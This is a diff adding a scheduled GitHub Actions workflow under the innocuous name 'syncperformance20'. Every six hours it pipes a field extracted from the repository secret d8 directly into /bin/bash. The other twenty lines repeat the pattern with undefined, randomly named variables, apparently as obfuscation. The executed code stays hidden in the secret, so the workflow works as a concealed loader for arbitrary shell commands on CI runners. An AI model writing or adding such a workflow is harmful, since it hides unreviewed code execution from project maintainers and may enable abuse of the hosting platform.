@@ -1,0 +1,37 @@
+name: syncperformance20
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: syncperformance20
+        env:
+          d8: ${{ secrets.d8 }}
+        run: |
+          echo $d8 | jq -r .bgxb4 | /bin/bash
+          echo $pg8618 | jq -r .f61501 | /bin/bash
+          echo $q4969 | jq -r .ondyh1 | /bin/bash
+          echo $eh1 | jq -r .fccry8 | /bin/bash
+          echo $jsk1 | jq -r .xjewt2728 | /bin/bash
+          echo $lhhf9 | jq -r .spw4 | /bin/bash
+          echo $tyycd0133 | jq -r .spa50091 | /bin/bash
+          echo $gov0611 | jq -r .q30 | /bin/bash
+          echo $q16279 | jq -r .d43 | /bin/bash
+          echo $rvhe8 | jq -r .lx9 | /bin/bash
+          echo $pwyyn6410 | jq -r .bxd641 | /bin/bash
+          echo $djfs48804 | jq -r .e8 | /bin/bash
+          echo $ebz640 | jq -r .qjl0860 | /bin/bash
+          echo $jmcky04475 | jq -r .rtky4418 | /bin/bash
+          echo $c8956 | jq -r .hfnw9415 | /bin/bash
+          echo $gryym021 | jq -r .sd1596 | /bin/bash
+          echo $q0 | jq -r .hr5 | /bin/bash
+          echo $odi7 | jq -r .wjq272 | /bin/bash
+          echo $mlr870 | jq -r .ocjqr09 | /bin/bash
+          echo $ay09 | jq -r .itrja8 | /bin/bash
+          echo $axggq02 | jq -r .jjymz3 | /bin/bash
+
